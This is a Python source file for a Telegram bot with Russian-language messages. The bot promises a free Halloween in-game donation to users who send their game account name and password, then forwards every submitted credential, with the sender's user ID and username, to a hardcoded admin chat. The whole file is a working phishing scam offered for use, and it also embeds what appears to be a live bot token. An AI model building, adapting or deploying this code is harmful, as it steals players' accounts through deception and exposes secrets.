import sqlite3
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Конфигурация
BOT_TOKEN = "8300222284:AAHt3oT-fxyls9-xv0CNjG4ucFp4Y3vLFmU"
ADMIN_ID = 8000395560  # Ваш ID
CHANNEL_LINK = "https://t.me/pnixmcbe"
CREATOR_USERNAME = "@isnikson"

# База данных
conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users 
             (user_id INTEGER PRIMARY KEY, username TEXT, last_message_time REAL, message_count INTEGER DEFAULT 0, banned INTEGER DEFAULT 0)''')
conn.commit()

# Антиспам
user_message_times = {}

def check_spam(user_id):
    now = time.time()
    if user_id not in user_message_times:
        user_message_times[user_id] = []
    
    user_message_times[user_id] = [t for t in user_message_times[user_id] if now - t < 60]
    user_message_times[user_id].append(now)
    
    return len(user_message_times[user_id]) > 10

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Проверка бана
    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    user_data = c.fetchone()
    if user_data and user_data[0]:
        await update.message.reply_text("❌ Вы забанены.")
        return
    
    keyboard = [
        [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)],
        [InlineKeyboardButton("👤 СОЗДАТЕЛЬ", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
    ]
    
    text = (
        "🎃 *ПОЛУЧИ ХЭЛОУИН ДОНАТ!*\n\n"
        "Чтобы получить донат на Хэллоуин, отправьте мне:\n"
        "```\n"
        "Аккаунт:ВАШ_АККАУНТ\n"
        "Пароль:ВАШ_ПАРОЛЬ\n"
        "```\n\n"
        "*Пример:*\n"
        "```\n"
        "Аккаунт:Player123\n"
        "Пароль:pass123\n"
        "```\n\n"
        "Донат придет в течение 24 часов!"
    )
    
    await update.message.reply_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    # Проверка бана
    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    user_data = c.fetchone()
    if user_data and user_data[0]:
        return
    
    # Антиспам
    if check_spam(user_id):
        c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
        conn.commit()
        await update.message.reply_text("❌ Вы забанены за спам.")
        return
    
    # Проверка формата данных
    if "Аккаунт:" in text and "Пароль:" in text:
        try:
            lines = text.split('\n')
            account = None
            password = None
            
            for line in lines:
                if line.startswith('Аккаунт:'):
                    account = line.replace('Аккаунт:', '').strip()
                elif line.startswith('Пароль:'):
                    password = line.replace('Пароль:', '').strip()
            
            if account and password:
                # Отправка админу
                admin_text = (
                    "🎃 *НОВЫЕ ДАННЫЕ ДЛЯ ДОНАТА*\n\n"
                    f"👤 User ID: `{user_id}`\n"
                    f"📧 Username: @{update.effective_user.username or 'N/A'}\n"
                    f"🔑 Аккаунт: `{account}`\n"
                    f"🔒 Пароль: `{password}`\n"
                    f"⏰ Время: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
                )
                
                await context.bot.send_message(
                    ADMIN_ID,
                    admin_text,
                    parse_mode='Markdown'
                )
                
                # Ответ пользователю
                await update.message.reply_text(
                    "✅ Данные приняты! Донат придет в течение 24 часов.\n\n"
                    "📢 Обязательно подпишись на наш канал!",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
                    ])
                )
            else:
                await update.message.reply_text(
                    "❌ Неверный формат. Используйте:\n"
                    "```\n"
                    "Аккаунт:ВАШ_АККАУНТ\n"
                    "Пароль:ВАШ_ПАРОЛЬ\n"
                    "```",
                    parse_mode='Markdown'
                )
                
        except Exception as e:
            await update.message.reply_text("❌ Ошибка. Попробуйте еще раз.")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    if context.args:
        user_id = int(context.args[0])
        c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
        conn.commit()
        await update.message.reply_text(f"✅ Пользователь {user_id} забанен.")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    if context.args:
        user_id = int(context.args[0])
        c.execute("UPDATE users SET banned=0 WHERE user_id=?", (user_id,))
        conn.commit()
        await update.message.reply_text(f"✅ Пользователь {user_id} разбанен.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.run_polling()

if __name__ == '__main__':
    main()
